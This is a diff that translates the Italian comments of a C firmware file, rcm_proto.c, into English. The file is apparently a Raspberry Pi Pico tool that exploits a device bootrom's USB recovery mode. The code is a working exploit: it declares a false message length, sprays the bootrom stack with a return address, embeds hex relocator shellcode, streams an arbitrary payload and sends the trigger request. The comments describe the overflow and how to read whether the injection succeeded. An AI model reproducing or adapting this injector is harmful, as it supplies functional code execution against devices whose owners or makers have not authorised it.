@@ -1,21 +1,20 @@
 /*
  * rcm_proto.c
  *
- * Costruzione e invio del messaggio RCM.
+ * Building and sending the RCM message.
  *
- * Due vincoli hanno deciso la forma di questo file:
+ * Two constraints decided the shape of this file:
  *
- * 1. Il payload NON viene mai caricato interamente in RAM. Il Pico ha
- *    264 KB: si legge un pezzo dal FAT12 con FatFs, lo si accoda al
- *    pacchetto in uscita, si riusa il buffer.
+ * 1. The payload is NEVER loaded into RAM in one piece. The Pico has
+ *    264 KB: a chunk is read from the FAT12 through FatFs, appended to the
+ *    outgoing packet, and the buffer is reused.
  *
- * 2. Il messaggio e' un FLUSSO di byte, non una sequenza di blocchi
- *    allineati. L'header e' di 680 byte (0x2A8), quindi tutto quello
- *    che segue - spray, intermezzo, payload - cade a cavallo dei
- *    pacchetti da 0x1000. Da qui il writer bufferizzato: si scrive a
- *    byte, si spedisce a pacchetti pieni. Ogni tentativo di allineare
- *    i pezzi ai 0x1000 sposta l'intera mappa di memoria del target e
- *    l'iniezione non fa niente.
+ * 2. The message is a STREAM of bytes, not a sequence of aligned blocks.
+ *    The header is 680 bytes (0x2A8), so everything that follows - spray,
+ *    intermezzo, payload - straddles the 0x1000 packets. Hence the
+ *    buffered writer: written byte-wise, sent as full packets. Any attempt
+ *    to align the pieces to 0x1000 shifts the target's whole memory map
+ *    and the injection does nothing.
  */
 #include <stdio.h>
 #include <string.h>
@@ -32,9 +31,9 @@
 #define TRIGGER_TIMEOUT_MS   5000u
 
 /*
- * Relocator: gira a 0x4001F000, ricopia 0x1000 byte alla volta il
- * payload da RCM_PAYLOAD_LOAD_BLOCK a RCM_PAYLOAD_ADDR e ci salta.
- * Le ultime quattro word sono, in ordine: 0x4001F020, 0x4001F05C,
+ * Relocator: runs at 0x4001F000, copies the payload 0x1000 bytes at a time
+ * from RCM_PAYLOAD_LOAD_BLOCK to RCM_PAYLOAD_ADDR and jumps into it.
+ * The last four words are, in order: 0x4001F020, 0x4001F05C,
  * RCM_PAYLOAD_LOAD_BLOCK, RCM_PAYLOAD_ADDR.
  */
 static const uint8_t intermezzo[92] = {
@@ -48,31 +47,31 @@ static const uint8_t intermezzo[92] = {
     0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
 };
 
-// Il payload deve atterrare esattamente su RCM_PAYLOAD_LOAD_BLOCK. Se
-// qualcuno tocca un define e la somma non torna piu', meglio un errore
-// di build che un'iniezione che parte e non fa niente.
+// The payload has to land exactly on RCM_PAYLOAD_LOAD_BLOCK. If someone
+// touches a define and the arithmetic stops adding up, a build error beats
+// an injection that runs and does nothing.
 _Static_assert(sizeof(intermezzo) < RCM_CHUNK_SIZE,
-               "intermezzo e padding devono stare in un solo blocco");
+               "intermezzo and padding must fit in a single block");
 _Static_assert(RCM_HEADER_SIZE % 4u == 0u,
-               "lo spray dopo l'header deve restare allineato a 4");
+               "the spray after the header must stay 4-byte aligned");
 _Static_assert(RCM_PREFIX_SIZE == 0x102A8u,
-               "prefisso alterato: il payload non cade su 0x40020000");
+               "prefix altered: the payload no longer lands on 0x40020000");
 _Static_assert(RCM_PAYLOAD_MAX > 0u && RCM_PAYLOAD_MAX == 0x1FFF0u,
-               "tetto payload incoerente con RCM_MAX_MSG_LEN");
+               "payload ceiling inconsistent with RCM_MAX_MSG_LEN");
 _Static_assert(RCM_PAYLOAD_LOAD_BLOCK + RCM_PAYLOAD_MAX <= RCM_IRAM_END,
-               "un payload al tetto sfonderebbe la fine dell'IRAM");
+               "a payload at the ceiling would run past the end of IRAM");
 _Static_assert(RCM_PAYLOAD_ADDR + RCM_PAYLOAD_MAX <= RCM_IRAM_END,
-               "la copia dell'intermezzo sfonderebbe la fine dell'IRAM");
+               "the intermezzo's copy would run past the end of IRAM");
 
 static FATFS fs;
 
-// ------------------------------------------------------- writer bufferizzato
+// ------------------------------------------------------- buffered writer
 
-// Allineamento esplicito: e' un buffer DMA per TinyUSB. GCC allinea
-// comunque un array di questa taglia, ma non e' garantito dallo standard
-// e qui non si vuole scoprirlo in campo. L'equivalente lato TinyUSB e'
-// CFG_TUH_MEM_ALIGN; non lo si usa direttamente per tenere questo file
-// libero da tusb.h (cosi' resta compilabile fuori dal target).
+// Explicit alignment: this is a DMA buffer for TinyUSB. GCC aligns an array
+// of this size anyway, but that is not guaranteed by the standard and this
+// is not something to find out in the field. The TinyUSB equivalent is
+// CFG_TUH_MEM_ALIGN; it is not used directly so this file stays free of
+// tusb.h (which keeps it compilable off-target).
 static uint8_t  packet[RCM_CHUNK_SIZE] __attribute__((aligned(4)));
 static uint32_t packet_used;
 static uint32_t packets_sent;
@@ -82,8 +81,8 @@ static void wr_reset(void) {
     packets_sent = 0;
 }
 
-// Spedisce sempre un pacchetto PIENO: il target ragiona per blocchi da
-// 0x1000, non per byte utili. La coda viene azzerata.
+// Always sends a FULL packet: the target thinks in 0x1000 blocks, not in
+// useful bytes. The tail is zeroed.
 static bool wr_flush(void) {
     if (packet_used < RCM_CHUNK_SIZE) {
         memset(packet + packet_used, 0, RCM_CHUNK_SIZE - packet_used);
@@ -136,17 +135,17 @@ static bool wr_zero(uint32_t len) {
     return true;
 }
 
-// ------------------------------------------------------- messaggio
+// ------------------------------------------------------- message
 
-// Header: lunghezza dichiarata (il massimo accettato, non quella reale)
-// e poi zeri fino a 680 byte.
+// Header: the declared length (the maximum accepted, not the real one)
+// followed by zeros up to 680 bytes.
 static bool send_header(void) {
     return wr_u32(RCM_MAX_MSG_LEN)
         && wr_zero(RCM_HEADER_SIZE - 4u);
 }
 
-// Spray dell'indirizzo dell'intermezzo su tutta la finestra che contiene
-// lo stack del bootrom.
+// Sprays the intermezzo's address across the whole window that holds the
+// bootrom's stack.
 static bool send_stack_spray(void) {
     for (uint32_t i = 0; i < RCM_SPRAY_WORDS; i++) {
         if (!wr_u32(RCM_INTERMEZZO_ADDR)) return false;
@@ -154,8 +153,8 @@ static bool send_stack_spray(void) {
     return true;
 }
 
-// Intermezzo + padding: insieme occupano esattamente un blocco da
-// 0x1000, cosi' il payload atterra su RCM_PAYLOAD_LOAD_BLOCK.
+// Intermezzo + padding: together they take up exactly one 0x1000 block, so
+// the payload lands on RCM_PAYLOAD_LOAD_BLOCK.
 static bool send_intermezzo(void) {
     return wr(intermezzo, sizeof(intermezzo))
         && wr_zero(RCM_CHUNK_SIZE - sizeof(intermezzo));
@@ -173,13 +172,13 @@ static bool send_payload(FIL *fp) {
     return true;
 }
 
-// ------------------------------------------------------- sequenza
+// ------------------------------------------------------- sequence
 
 bool rcm_proto_inject(void) {
-    // ---- 1. il target risponde? Il device ID e' la prima cosa che il
-    //         bootrom mette sull'endpoint IN. Se non arriva lo diciamo e
-    //         proviamo comunque: alcuni target lo consegnano in ritardo e
-    //         l'iniezione riesce lo stesso.
+    // ---- 1. is the target answering? The device ID is the first thing the
+    //         bootrom puts on the IN endpoint. If it does not arrive we say
+    //         so and try anyway: some targets deliver it late and the
+    //         injection still succeeds.
     uint8_t device_id[RCM_DEVICE_ID_LEN];
     if (rcm_bulk_in(device_id, sizeof(device_id), DEVICE_ID_TIMEOUT_MS)) {
         printf("[rcm] device ID:");
@@ -189,7 +188,7 @@ bool rcm_proto_inject(void) {
         printf("[rcm] device ID non letto - continuo comunque\n");
     }
 
-    // ---- 2. payload dal FAT12 in flash
+    // ---- 2. payload from the FAT12 in flash
     if (f_mount(&fs, "", 1) != FR_OK) {
         printf("[rcm] mount FAT fallito\n");
         return false;
@@ -209,11 +208,10 @@ bool rcm_proto_inject(void) {
         f_unmount("");
         return false;
     }
-    // Il tetto e' il soffitto dell'IRAM, non una convenzione: il payload
-    // atterra su RCM_PAYLOAD_LOAD_BLOCK e oltre RCM_IRAM_END non c'e'
-    // memoria. Un payload piu' grande non puo' funzionare in nessun caso,
-    // quindi tanto vale dirlo qui invece di lasciarlo diventare un
-    // timeout su un bulk OUT a meta' invio.
+    // The ceiling is the top of IRAM, not a convention: the payload lands on
+    // RCM_PAYLOAD_LOAD_BLOCK and past RCM_IRAM_END there is no memory. A
+    // larger payload cannot work under any circumstances, so it is better
+    // said here than left to become a timeout on a bulk OUT halfway through.
     if (payload_size > RCM_PAYLOAD_MAX) {
         printf("[rcm] payload troppo grande: %lu byte, il tetto e' %lu "
                "(soffitto IRAM a 0x%08x)\n",
@@ -225,47 +223,47 @@ bool rcm_proto_inject(void) {
     }
     printf("[rcm] payload %lu byte\n", (unsigned long)payload_size);
 
-    // ---- 3. costruzione del messaggio, in streaming
+    // ---- 3. building the message, streamed
     wr_reset();
     if (!send_header())        goto fail;
     if (!send_stack_spray())   goto fail;
     if (!send_intermezzo())    goto fail;
     if (!send_payload(&fp))    goto fail;
-    if (!wr_flush())           goto fail;    // coda parziale
+    if (!wr_flush())           goto fail;    // partial tail
 
     f_close(&fp);
     f_unmount("");
 
-    // ---- 4. parita'. Il bootrom alterna due buffer di copia ad ogni
-    //         pacchetto da 0x1000; con un numero dispari di pacchetti
-    //         l'ultima copia atterra su quello giusto. Se siamo pari, un
-    //         pacchetto di padding in piu' rimette a posto.
+    // ---- 4. parity. The bootrom alternates between two copy buffers on
+    //         every 0x1000 packet; with an odd number of packets the last
+    //         copy lands on the right one. If we are even, one extra
+    //         padding packet puts it back.
     if ((packets_sent % 2u) != 1u) {
         if (!wr_flush()) return false;
     }
     printf("[rcm] %lu pacchetti da 0x%x spediti\n",
            (unsigned long)packets_sent, RCM_CHUNK_SIZE);
 
-    // ---- 5. trigger, atteso.
+    // ---- 5. the trigger, awaited.
     //
-    //  Qui NON si appiattisce l'esito su "successo/fallimento", perche' i
-    //  quattro casi vogliono dire cose diverse:
+    //  The outcome is NOT flattened into "success/failure" here, because the
+    //  four cases mean different things:
     //
-    //    OK       il bootrom ha chiuso lo status stage prima di saltare.
-    //    TIMEOUT  non risponde piu'. E' l'esito NORMALE di un'iniezione
-    //             riuscita: il target sta gia' eseguendo il payload e non
-    //             ha nessun motivo di chiudere il transfer. Trattarlo
-    //             come errore vorrebbe dire accendere il LED rosso
-    //             proprio quando ha funzionato - e il LED e' l'unico
-    //             feedback che si ha in campo.
-    //    STALLED  il device ha RESPINTO la richiesta. Questo e' il
-    //             fallimento vero: l'overflow non e' avvenuto.
-    //    FAILED   non e' nemmeno partita.
+    //    OK       the bootrom closed the status stage before jumping.
+    //    TIMEOUT  no more answers. This is the NORMAL outcome of a
+    //             successful injection: the target is already running the
+    //             payload and has no reason to close the transfer. Treating
+    //             it as an error would mean lighting the red LED precisely
+    //             when it worked - and the LED is the only feedback there
+    //             is in the field.
+    //    STALLED  the device REJECTED the request. This is the real
+    //             failure: the overflow did not happen.
+    //    FAILED   it never even started.
     //
-    //  L'unico verdetto definitivo resta lo schermo del target, ma
-    //  distinguere stall da timeout e' l'unica informazione utile che si
-    //  puo' cavare da questo lato del cavo, e buttarla via sarebbe uno
-    //  spreco.
+    //  The only definitive verdict is still the target's screen, but telling
+    //  a stall from a timeout is the one useful piece of information that
+    //  can be had from this side of the cable, and throwing it away would be
+    //  a waste.
     rcm_xfer_t trig = rcm_control_out(RCM_TRIGGER_BMREQTYPE, RCM_TRIGGER_BREQUEST,
                                       0, 0, RCM_TRIGGER_WLENGTH, TRIGGER_TIMEOUT_MS);
     printf("[rcm] trigger: %s\n", rcm_xfer_name(trig));
